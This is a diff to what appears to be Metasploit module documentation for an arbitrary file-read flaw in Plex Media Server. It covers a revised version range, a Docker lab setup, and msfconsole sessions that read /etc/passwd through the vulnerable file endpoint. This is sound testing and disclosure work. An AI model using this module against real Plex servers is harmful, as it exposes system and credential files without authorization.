@@ -1,6 +1,6 @@
 ## Vulnerable Application
 
-Plex Media Server (<= 1.43.2.10687, and the first 1.43.3 build 10828) exposes
+Plex Media Server versions up to and including 1.43.3.10861 expose
 GET /library/metadata/<ratingKey>/file?url=<media-reference>. The handler
 resolves the caller-supplied media reference without validating its scheme or
 confining the resolved path to the item's metadata bundle directory. Supplying
@@ -16,54 +16,67 @@ X-Plex-Token belonging to any user with library visibility works otherwise.
 
 ### Docker setup
 
-The following `docker-compose.yml` will start the 1.43.2 and 1.43.3 branches on port 32402 and 32403.
+The following `docker-compose.yml` will start a vulnerable Plex Media Server (1.43.2.10687) on port 32400. To test a different version, change only the `image:` tag and restart from a fresh `data/` directory to avoid database upgrades between versions (the container writes parts of `data/` as root):
+
+```bash
+docker compose down
+docker run --rm -v "$PWD/data:/d" busybox rm -rf /d/config /d/transcode
+rm -rf data
+```
 
 ```
 version: "3"
 
 services:
-  pms1432:
+  pms:
     image: plexinc/pms-docker:1.43.2.10687-563d026ea-amd64
-    container_name: pms1432
-    hostname: pms1432
+    container_name: pms
+    hostname: pms
     environment:
       - PLEX_UID=1000
       - PLEX_GID=1000
       - TZ=UTC
       - PLEX_CLAIM=claim-dummy
-      - ADVERTISE_IP=http://127.0.0.1:32402/
+      - ADVERTISE_IP=http://127.0.0.1:32400/
     volumes:
-      - ./data1432/config:/config
-      - ./data1432/transcode:/transcode
+      - ./data/config:/config
+      - ./data/transcode:/transcode
       - ./media:/data
     ports:
-      - "32402:32400"
+      - "32400:32400"
+```
 
-  pms1433:
-    image: plexinc/pms-docker:1.43.3.10828-00f62d37d-amd64
-    container_name: pms1433
-    hostname: pms1433
-    environment:
-      - PLEX_UID=1000
-      - PLEX_GID=1000
-      - TZ=UTC
-      - PLEX_CLAIM=claim-dummy
-      - ADVERTISE_IP=http://127.0.0.1:32403/
-    volumes:
-      - ./data1433/config:/config
-      - ./data1433/transcode:/transcode
-      - ./media:/data
-    ports:
-      - "32403:32400"
+Create the bind-mount directories and generate a benign local media item, then start the container:
+
+```bash
+mkdir -p data/config data/transcode media
+ffmpeg -y -f lavfi -i color=c=black:s=320x240:d=1 -c:v libx264 -pix_fmt yuv420p media/test.mp4
+docker compose up -d
+until curl -fsS http://127.0.0.1:32400/identity >/dev/null; do sleep 1; done
+```
+
+Create and scan a legitimate library item so the file endpoint has a metadata `ratingKey`:
+
+```bash
+docker exec --user plex \
+  -e PLEX_MEDIA_SERVER_APPLICATION_SUPPORT_DIR="/config/Library/Application Support" \
+  -e PLEX_MEDIA_SERVER_HOME=/usr/lib/plexmediaserver \
+  -e LD_LIBRARY_PATH=/usr/lib/plexmediaserver \
+  pms "/usr/lib/plexmediaserver/Plex Media Scanner" \
+  --add-section Videos --type 1 --agent com.plexapp.agents.none --location /data --lang en-US
+docker exec --user plex \
+  -e PLEX_MEDIA_SERVER_APPLICATION_SUPPORT_DIR="/config/Library/Application Support" \
+  -e PLEX_MEDIA_SERVER_HOME=/usr/lib/plexmediaserver \
+  -e LD_LIBRARY_PATH=/usr/lib/plexmediaserver \
+  pms "/usr/lib/plexmediaserver/Plex Media Scanner" --scan --section 1 --no-thumbs
 ```
 
 ## Verification Steps
-Example steps in this format (is also in the PR):
 
-1. Install the application
+1. Follow the Docker setup above, including creating and scanning the library item
 1. Start msfconsole
 1. Do: `use auxiliary/scanner/http/plex_media_server_file_read`
-1. Do: `set rport 32402`
+1. Do: `set rport 32400`
 1. Do: `set rhosts 127.0.0.1`
 1. Do: `set file /etc/passwd`
 1. Do: `run`
@@ -89,8 +102,8 @@ Metadata ratingKey to use (auto-discovered if unset). Defaults to ``
 
 ```
 msf > use auxiliary/scanner/http/plex_media_server_file_read
-msf auxiliary(scanner/http/plex_media_server_file_read) > set rport 32402
-rport => 32402
+msf auxiliary(scanner/http/plex_media_server_file_read) > set rport 32400
+rport => 32400
 msf auxiliary(scanner/http/plex_media_server_file_read) > set rhosts 127.0.0.1
 rhosts => 127.0.0.1
 msf auxiliary(scanner/http/plex_media_server_file_read) > set file /etc/passwd
@@ -127,11 +140,11 @@ uuidd:x:100:101::/run/uuidd:/usr/sbin/nologin
 ### 1.43.3.10828-00f62d37d on Docker
 
 ```
-msf > use auxiliary/scanner/http/plex_media_server_file_read 
+msf > use auxiliary/scanner/http/plex_media_server_file_read
 msf auxiliary(scanner/http/plex_media_server_file_read) > set rhosts 127.0.0.1
 rhosts => 127.0.0.1
-msf auxiliary(scanner/http/plex_media_server_file_read) > set rport 32403
-rport => 32403
+msf auxiliary(scanner/http/plex_media_server_file_read) > set rport 32400
+rport => 32400
 msf auxiliary(scanner/http/plex_media_server_file_read) > run
 [*] Version: 1.43.3.10828-00f62d37d
 [*] Using ratingKey 1
